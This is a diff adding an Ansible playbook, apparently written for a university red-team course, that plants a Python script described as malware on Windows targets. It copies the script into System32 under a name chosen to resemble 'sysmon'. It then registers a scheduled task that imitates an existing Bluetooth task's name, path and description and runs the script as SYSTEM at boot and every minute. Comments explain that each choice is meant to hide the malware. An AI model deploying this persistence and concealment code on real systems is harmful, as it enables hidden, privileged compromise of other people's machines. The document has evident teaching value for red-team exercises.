@@ -1,0 +1,35 @@
+---
+#Author: Dexter Delandro
+#CSEC 473 - Spring 2022
+
+#copies the python malware script into the target machine
+- name: Copy file to location
+  ansible.windows.win_copy:
+    src: files\createUsers.py
+    dest: C:\Windows\System32\sysman.py
+    #named the script "sysman" becaue there is a "sysmon" in the /lib/ folder already
+    #these names being similar is an attempt to hide the malware file name.
+
+#creates a Windows Schedule Task that runs the python script every minute
+- name: Create schedule task
+  community.windows.win_scheduled_task:
+    #named InstallDevice Task becauset there is a pre-exsiting  "UninstallDeviceTask" scheduled task in the 
+    # \Microsfot\Windows\Bluetooth directory. The similar names are an attempt to hide the created scheduled task
+    name: InstallDeviceTask
+    path: \Microsoft\Windows\Bluetooth\
+    description: Installs the PnP device associated with the specified Bluetooth service ID
+    #The description matches the description for the pre-existing "UninstallDeviceTask"
+    actions:
+    #Call in the python executable with a parameter of the malware's filepath.
+      - path: python.exe
+        arguments: c:\Windows\System32\sysman.py
+    triggers:
+    #This makes it so the schedule task starts on boot
+    - type: boot
+      repetition:
+      #This makes it so the scheduel task runs every minute
+        interval: PT1M        
+    # This allows us to run the script with the highest level of permissions.
+    username: NT Authority\SYSTEM
+    run_level: highest
+    state: present
